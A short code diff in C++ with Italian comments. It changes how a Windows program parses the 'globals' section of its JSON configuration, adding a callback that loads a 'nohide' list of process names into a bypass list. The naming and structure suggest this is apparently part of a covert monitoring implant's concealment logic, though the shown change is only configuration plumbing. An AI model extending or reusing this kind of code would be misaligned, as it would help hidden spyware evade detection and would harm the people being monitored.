@@ -2076,11 +2076,11 @@ BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back)
 	return TRUE;
 }
 
-// Torna l'oggetto json di tutta la configurazione
-BOOL HM_ParseConfGlobals(char *conf, JSONObject *obj)
+// Passa l'oggetto json delle globals
+BOOL HM_ParseConfGlobals(char *conf, conf_callback_t call_back)
 {
 	JSONValue *value;
-	JSONObject root;
+	JSONObject root, obj;
 
 	value = JSON::Parse(conf);
 	if (!value)
@@ -2090,19 +2090,32 @@ BOOL HM_ParseConfGlobals(char *conf, JSONObject *obj)
 		return FALSE;
 	}
 	root = value->AsObject();
-	*obj = root[L"globals"]->AsObject();
+	obj = root[L"globals"]->AsObject();
+	call_back(obj);
 
 	delete value;
 	return TRUE;
 }
 
+void WINAPI ParseBypassCallback(JSONObject conf_json)
+{
+	DWORD index;
+	JSONArray bypass_array = conf_json[L"nohide"]->AsArray();
+	process_bypassed = bypass_array.size();
+	if (process_bypassed > MAX_DYNAMIC_BYPASS)
+		process_bypassed = MAX_DYNAMIC_BYPASS;
+	process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded
+
+	// Legge i processi rimanenti dal file di configurazione
+	for (index=0; index<bypass_array.size(); index++) 
+		_snprintf_s(process_bypass_list[index+EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
+}
 
 // Legge le configurazioni globali
 void HM_UpdateGlobalConf()
 {
 	HANDLE h_conf_file;
 	DWORD readn;
-	JSONObject conf_json;
 	char conf_path[DLLNAMELEN];
 	char *conf_memory;
 
@@ -2146,18 +2159,8 @@ void HM_UpdateGlobalConf()
 
 	// Legge la lista dei processi da bypassare 
 	conf_memory = HM_ReadClearConfBSON(H4_CONF_FILE);
-	if (conf_memory && HM_ParseConfGlobals(conf_memory, &conf_json)) {
-		DWORD index;
-		JSONArray bypass_array = conf_json[L"nohide"]->AsArray();
-		DWORD process_bypassed = bypass_array.size();
-		if (process_bypassed > MAX_DYNAMIC_BYPASS)
-			process_bypassed = MAX_DYNAMIC_BYPASS;
-		process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded
-
-		// Legge i processi rimanenti dal file di configurazione
-		for (index=0; index<bypass_array.size(); index++) 
-			_snprintf_s(process_bypass_list[index+EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
-	}
+	if (conf_memory)
+		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
 	SAFE_FREE(conf_memory);
 }
 
